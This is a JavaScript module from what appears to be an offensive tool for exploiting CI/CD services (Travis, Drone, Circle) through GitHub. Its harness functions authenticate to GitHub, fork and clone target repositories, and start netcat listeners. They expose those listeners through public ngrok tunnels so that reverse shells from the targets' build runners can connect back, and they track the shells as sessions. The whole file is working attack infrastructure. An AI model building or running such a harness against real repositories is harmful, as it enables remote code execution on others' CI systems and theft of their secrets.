const log = console.log,
  fs = require('fs'),
  clear = require('clear'),
  chalk = require('chalk'),
  red = chalk.red,
  green = chalk.green,
  path = require('path'),
  github = require(__dirname + '/gh'),
  exdir = __dirname + '/../exploits',
  expath = path.resolve(exdir),
  files = require(__dirname + '/files'),
  targets = require(__dirname + '/targets'),
  repos = require(__dirname + '/repos'),
  server = require(__dirname + '/server'),
  ng = require(__dirname + '/ng')

module.exports = {

  //Prints list of exploits
  printExploits: () => {
    clear();
    log(chalk.cyan("------------", "\n Exploits ", "\n------------"));
    const exlist = files.walkSync(exdir),
      tlist = [];
    exlist.forEach((item) => {
      if (item.includes("exploit.js")) {
        tlist.push(item);
        log(item.replace(`${expath}/`, '').replace('/exploit.js', ''));
      }
    });
    log();
    return tlist;
  },

  //Checks if exploits exist
  exploitExists: (exploit) => {
    return fs.existsSync(`${exdir}/${exploit}/exploit.js`);
  },

  /* -------------------------------
    Exploit Writing Functions
    -------------------------------*/

  /*
  exploitMultiHarness
  -------------------
  This will be the "mountin harness" for writing exploits.
  When writing exploits here is where to start.

  Parameters:
    auth_type - just 'github' for now, but will soon be others
    fork_type - 'forked' is the only option for now. Any others will result in trying to commit right to the branch without forking it
    target_type - 'travis', 'drone', and 'circle' are currently accepted
    exploit_name - name of exploit. Generate by sending in results of module.exports.name() in exploit file
    cb - callback

  Returns: null, raw_targets, ci_targets,hostname_arr, port_arr, server_arr, url_arr
    err - errors
    token - Auth token
    authed_user - Authed user
    raw_targets - Array of targets w/ original owner names
    ci_targets - Array of forked target repos, only consisting of valid exploit types (travis, drone, etc.)
    hostname_arr - Array of public hostnames from NGROK for callbacks
    port_arr - Array of NGROK public ports
    server_arr - Array of server objects from NGROK (not used that much)
    url_arr - Array of full NGROK URLS (also not used much)
  */

  exploitMultiHarness: (auth_type, fork_type, target_type, exploit_name, cb) => {
    let token = "";
    let authed_user = "";

    // Switch to decide auth type
    switch (auth_type) {
      case 'github':
        github.githubAuth((err, tok, user) => {
          // Check for auth errors
          if (err) {
            switch (err.code) {
              case 401:
                log(chalk.red('Couldn\'t log you in. Please try again.'));
                break;
              case 422:
                log(chalk.red('You already have an access token.'));
                break;
            }
            return cb(err);
          }
          token = tok;
          authed_user = user;
        })
        break;
      default:
        log(red("Uknown authtype in exploitMultiHarness"));
        cb();
        break;
    }

    // Check if there are targets to run against
    if (targets.getNumTargets() === 0) {
      log(red("There are no targets to exploit. Exiting run."));
      return cb("ERROR");
    }

    // If token exists, continue with exploit
    if (token) {
      const type = fork_type;

      // Ngrok Auth
      ng.ngrokAuth((err, ngtoken) => {
        // check for ngrok err
        if (err) {
          log(chalk.red(`ERROR with ngrok authentication. ${err}`));
          return cb("ERROR");
        }
        let ng_token = ngtoken;

        if (fork_type == 'forked') {
          // Fork all repos in targets
          repos.forkAll(token, authed_user, () => {

            // Clone all repos that have been forked
            repos.cloneAllRepos(type, authed_user, () => {

              // CREATE TRAVIS SPECIFIC LIST HERE TO USE FROM HERE ON OUT
              targets.getForkedTargetType(target_type, authed_user, type, (raw_targets, ci_targets) => {

                // Start a netcat listener for each cloned repo
                server.startNetcatAll(ci_targets, (nc_arr, ports_arr, dupIn_arr, dupOut_arr) => {

                  // Push global lists for new shells
                  global.shells_arr.push.apply(global.shells_arr, nc_arr);
                  global.duplexInput_arr.push.apply(global.duplexInput_arr, dupIn_arr);
                  global.duplexOutput_arr.push.apply(global.duplexOutput_arr, dupOut_arr);
                  global.session_name_arr.push.apply(global.session_name_arr, raw_targets);
                  for (let l = 0; l < global.nc_arr; l++) {
                    global.session_exploit_arr.push(exploit_name);
                  }

                  // Start an Ngrok instances for listening
                  log(green("Starting ngrok Services..."));
                  server.startNgrokAll(ports_arr, ng_token, (err, hostname_arr, port_arr, server_arr, url_arr) => {
                    if (err) {
                      log(err);
                      return cb(err);
                    } else {
                      return cb(null, token, authed_user, raw_targets, ci_targets, hostname_arr, port_arr, server_arr, url_arr)
                    }
                  })

                })
              })
            })
          })
        } else {
          // Fork all repos in targets

          // Clone all repos that have been forked
          repos.cloneAllRepos(type, authed_user, () => {

            // CREATE TRAVIS SPECIFIC LIST HERE TO USE FROM HERE ON OUT
            targets.getForkedTargetType(target_type, authed_user, type, (raw_targets, ci_targets) => {

              // Start a netcat listener for each cloned repo
              server.startNetcatAll(ci_targets, (nc_arr, ports_arr, dupIn_arr, dupOut_arr) => {

                // Push global lists for new shells
                global.shells_arr.push.apply(global.shells_arr, nc_arr);
                global.duplexInput_arr.push.apply(global.duplexInput_arr, dupIn_arr);
                global.duplexOutput_arr.push.apply(global.duplexOutput_arr, dupOut_arr);
                global.session_name_arr.push.apply(global.session_name_arr, raw_targets);
                for (let l = 0; l < global.nc_arr; l++) {
                  global.session_exploit_arr.push(exploit_name);
                }

                // Start an Ngrok instances for listening
                log(green("Starting ngrok Services..."));
                server.startNgrokAll(ports_arr, ng_token, (err, hostname_arr, port_arr, server_arr, url_arr) => {
                  if (err) {
                    log(err);
                    return cb(err);
                  } else {
                    return cb(null, token, authed_user, raw_targets, ci_targets, hostname_arr, port_arr, server_arr, url_arr)
                  }
                })

              })
            })
          })

        }

      })
    }
  },


  /*
  exploitSingleHarness
  -------------------
  This will be the "mountin harness" for writing exploits.
  This function is used when you have one netcat and ngrok listener and you would be listening for multiple calls to return to print 
  to stdout.
  
  Parameters:
    auth_type - just 'github' for now, but will soon be others
    fork_type - 'forked' is the only option for now. Any others will result in trying to commit right to the branch without forking it
    target_type - 'travis', 'drone', and 'circle' are currently accepted
    exploit_name - name of exploit. Generate by sending in results of module.exports.name() in exploit file
    cb - callback
  Returns: null, raw_targets, ci_targets,hostname_arr, port_arr, server_arr, url_arr
    err - errors
    token - Auth token
    authed_user - Authed user
    raw_targets - Array of targets w/ original owner names
    ci_targets - Array of forked target repos, only consisting of valid exploit types (travis, drone, etc.)
    nc - netcat instance
    duplex - the duplex stream object for handling shell connections
    nc_port - the netcat listening port (local)
    hostname - the ng hostname
    ng_port - Ngrok listening port (public)
    ng_server - Ngrok listening server object
    ng_url - Ngrok listening URL
  */
  exploitSingleHarness: (auth_type, fork_type, target_type, exploit_name, cb) => {
    let token = "";
    let authed_user = "";

    // Switch to decide auth type
    switch (auth_type) {
      case 'github':
        github.githubAuth((err, tok, user) => {
          // Check for auth errors
          if (err) {
            switch (err.code) {
              case 401:
                log(chalk.red('Couldn\'t log you in. Please try again.'));
                break;
              case 422:
                log(chalk.red('You already have an access token.'));
                break;
            }
            return cb(err);
          }
          token = tok;
          authed_user = user;
        })
        break;
      default:
        log(red("Uknown authtype in exploitSingleHarness"));
        cb();
        break;
    }

    // Check if there are targets to run against
    if (targets.getNumTargets() === 0) {
      log(red("There are no targets to exploit. Exiting run."));
      return cb("ERROR");
    }

    // If token exists, continue with exploit
    if (token) {
      const type = fork_type;

      // Ngrok Auth
      ng.ngrokAuth((err, ngtoken) => {
        // check for ngrok err
        if (err) {
          log(chalk.red(`ERROR with ngrok authentication. ${err}`));
          return cb("ERROR");
        }
        let ng_token = ngtoken;

        // Fork all repos in targets
        if (type == 'forked') {
          repos.forkAll(token, authed_user, () => {

            // Clone all repos that have been forked
            repos.cloneAllRepos(type, authed_user, () => {

              // CREATE TRAVIS SPECIFIC LIST HERE TO USE FROM HERE ON OUT
              targets.getForkedTargetType(target_type, authed_user, type, (raw_targets, ci_targets) => {

                // Start a netcat listener for each cloned repo
                server.startNetcatTempListener((nc, duplex, nc_port) => {

                  // Start an Ngrok instance for listening
                  log(green("Starting ngrok Services..."));
                  server.startNgrokConnect(nc_port, ng_token, (err, hostname, ng_port, ng_server, ng_url) => {
                    if (err) {
                      log(err);
                      return cb(err);
                    } else {
                      return cb(null, token, authed_user, raw_targets, ci_targets, nc, duplex, nc_port, hostname, ng_port, ng_server, ng_url);
                    }
                  });
                });
              })
            })
          })
        } else {
          // Clone all repos that have been forked
          repos.cloneAllRepos(type, authed_user, () => {

            // CREATE TRAVIS SPECIFIC LIST HERE TO USE FROM HERE ON OUT
            targets.getForkedTargetType(target_type, authed_user, type, (raw_targets, ci_targets) => {

              // Start a netcat listener for each cloned repo
              server.startNetcatTempListener((nc, duplex, nc_port) => {

                // Start an Ngrok instance for listening
                log(green("Starting ngrok Services..."));
                server.startNgrokConnect(nc_port, ng_token, (err, hostname, ng_port, ng_server, ng_url) => {
                  if (err) {
                    log(err);
                    return cb(err);
                  } else {
                    return cb(null, token, authed_user, raw_targets, ci_targets, nc, duplex, nc_port, hostname, ng_port, ng_server, ng_url);
                  }
                });
              });
            })
          })

        }

      })
    }
  }



}